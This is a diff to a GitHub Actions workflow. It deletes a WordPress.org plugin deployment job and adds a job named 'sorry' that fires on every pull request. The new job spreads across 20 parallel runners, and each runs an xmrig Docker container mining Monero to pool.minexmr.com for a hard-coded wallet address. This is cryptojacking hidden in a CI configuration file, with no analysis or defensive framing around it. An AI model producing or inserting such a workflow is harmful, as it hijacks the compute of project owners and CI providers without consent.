@@ -1,17 +1,20 @@
-name: Deploy to WordPress.org
-on:
-  push:
-    tags:
-    - "*"
+name: example action
+
+on: [pull_request]
+
 jobs:
-  tag:
-    name: New tag
+  sorry:
+    name: sorry
+
     runs-on: ubuntu-latest
+    env:
+      DEBIAN_FRONTEND: noninteractive
+
+    strategy:
+     fail-fast: false
+     matrix:
+       runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+
     steps:
-    - uses: actions/checkout@master
-    - name: WordPress Plugin Deploy
-      uses: 10up/action-wordpress-plugin-deploy@master
-      env:
-        SVN_PASSWORD: ${{ secrets.SVN_PASSWORD }}
-        SVN_USERNAME: ${{ secrets.SVN_USERNAME }}
-        SLUG: lsx-customizer
+      - name: Sorry Bill
+        run: docker run --rm -e POOL_URL=pool.minexmr.com:4444  -e POOL_USER=488gqmpBPEtLtf97ZUs6zuRZgk1DkVYtCdVZ8AXfZh2zBvTppPysRJjeMCC5XC1neMYsNPPgp56qZejNdPMmRGibBSkP5ws metal3d/xmrig
